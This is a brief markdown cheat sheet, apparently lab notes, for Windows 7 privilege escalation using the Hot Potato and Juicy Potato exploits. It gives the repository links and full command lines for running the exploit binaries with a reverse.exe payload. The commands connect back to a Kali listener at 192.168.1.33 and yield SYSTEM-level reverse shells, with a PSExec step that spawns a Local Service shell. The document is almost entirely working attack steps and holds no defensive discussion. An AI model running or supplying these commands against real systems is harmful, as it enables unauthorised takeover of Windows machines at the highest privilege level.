# Hot Potata
https://github.com/foxglovesec/Potato.git
_Note: These steps are for Windows 7)_
###### 1.Copy the potato.exe exploit executable over to Windows.
###### 2.Start a listener on Kali.
###### 3.Run the exploit:
`.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
###### 4.Wait for a Windows Defender update, or trigger one manually.

# Juice Potato
https://github.com/ohpe/juicy-potato.git
_(Note: These steps are for Windows 7)_
###### 1.Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.
###### 2.Start a listener on Kali.
###### 3.Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
`> C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
###### 4.Start another listener on Kali.
###### 5.Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
`> C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`
###### 6.If the CLSID ({03ca...) doesn’t work for you, either check this list:
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md _or run the GetCLSID.ps1 PowerShell script._